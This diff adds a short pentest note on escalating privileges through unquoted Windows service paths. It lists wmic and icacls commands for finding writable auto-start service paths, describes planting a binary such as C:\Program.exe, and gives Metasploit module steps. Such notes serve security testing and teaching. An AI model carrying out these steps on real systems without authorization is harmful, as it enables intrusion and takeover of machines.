@@ -1,0 +1,45 @@
+Finding services which may have a weakness where users with appropiate permissions can identify executables 
+which are set to auto enable at boot or reload of said service.
+
+use the following command to find these services:
+
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\" |findstr /i /v """
+
+This list will have to further be processed to identify which path you may be able to modify with the permissions level you 
+currently have. This may be locally or within a meterpreter session. You will want to search the folder location output from 
+the wmic command above. You usage may vary
+
+icacls "C:\Program Files (x86)\Some\Path\here"
+C:\Program Files (x86)\Some\Path\here        NT SERVICE\TrustedInstaller:(I)(F)
+                                             NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
+                                             NT AUTHORITY\SYSTEM:(I)(F)
+                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
+                                             BUILTIN\Administrators:(I)(F)
+                                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
+                                             BUILTIN\Users:(I)(RX)
+                                             BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                                             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+
+Here we are looking for the (F) falg to represent FULL control of that directory. 
+
+Once you have found a folder which was identified from the wmic command, you will have to place a binary within that search path
+
+for example:
+
+C:\Program.exe
+
+This file will be executed first as it was in the search path when the value is read from the registry entry: "ImagePath" 
+
+If you are using metasploit, there is a module for this ...
+
+exploit/windows/local/trusted_service_path
+
+after you have a shell, and migrated to an appropate process, getsystem | incognito | UAC trickery, background the session
+
+use exploit/windows/local/trusted_service_path
+set session NUMBERHERE
+exploit
+
+
